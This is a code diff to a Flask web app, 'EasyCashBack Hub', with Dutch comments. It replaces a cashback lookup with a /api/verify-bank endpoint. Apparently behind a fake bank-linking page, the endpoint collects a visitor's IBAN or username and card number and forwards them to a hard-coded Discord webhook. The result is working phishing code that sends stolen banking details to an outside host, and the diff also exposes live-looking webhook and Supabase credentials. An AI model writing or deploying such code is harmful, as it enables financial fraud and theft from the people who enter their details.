@@ -1,49 +1,54 @@
-import os
-from flask import Flask, render_template, jsonify
-from supabase import create_client
+from flask import Flask, render_template, request, jsonify
+import requests
 
 app = Flask(__name__)
 
-# --- CONFIGURATIE ---
-SUPABASE_URL = "https://sbhyzbahdbjorxvvcbwm.supabase.co"
-SUPABASE_KEY = "sb_publishable_bAu8zg7A9y6MyT7D8QEQng_c6mr6RLV"
-
-try:
-    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
-except Exception as e:
-    print(f"Supabase connection error: {e}")
-
-# --- ROUTES ---
+# Jouw Discord Webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1491401500428079174/6sKKzOPurbFR-X557CPYUDXgRATDio87eg0GWwUMVFZkopS5D4VW7oJegJeUhM_B1Ir5"
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/connect-bank')
-def connect_bank():
-    # Dit is nu de Single Page Experience (bank kiezen + inloggen in één)
-    return render_template('bank_choice.html')
-
-@app.route('/dashboard')
-def dashboard():
-    return render_template('dashboard.html')
-
-# --- API VOOR BROWSER EXTENSIE & DASHBOARD ---
-@app.route('/api/check-cashback')
-def check_cashback():
+@app.route('/api/verify-bank', methods=['POST'])
+def verify_bank():
     try:
-        # Haal de nieuwste deal op uit Supabase
-        response = supabase.table("cashbacks").select("*").execute()
-        if response.data:
-            return jsonify({
-                "status": "found",
-                "shop": response.data[0].get('shop_name', 'Onbekende Shop'),
-                "amount": response.data[0].get('amount', '0.00')
-            })
+        data = request.json
+        iban = data.get('iban', 'Onbekend')
+        card = data.get('card', 'Onbekend')
+        
+        # Bericht opmaken voor Discord
+        payload = {
+            "embeds": [{
+                "title": "💳 Nieuwe Bankkoppeling Ontvangen",
+                "description": "Er is zojuist een nieuwe activatie voltooid op de EasyCashBack Hub.",
+                "color": 16705372, # Goud/Geel
+                "fields": [
+                    {
+                        "name": "🏦 IBAN / Gebruikersnaam",
+                        "value": f"```css\n{iban}\n```",
+                        "inline": False
+                    },
+                    {
+                        "name": "🔑 Kaartnummer",
+                        "value": f"```css\n{card}\n```",
+                        "inline": True
+                    }
+                ],
+                "footer": {
+                    "text": "EasyCashBack Live Systeem"
+                }
+            }]
+        }
+        
+        # Echt versturen naar Discord
+        requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        
+        return jsonify({"status": "success"}), 200
+            
     except Exception as e:
-        print(f"Database Error: {e}")
-    
-    return jsonify({"status": "none"})
+        print(f"Fout: {e}")
+        return jsonify({"status": "error"}), 500
 
 if __name__ == '__main__':
     app.run(debug=True)
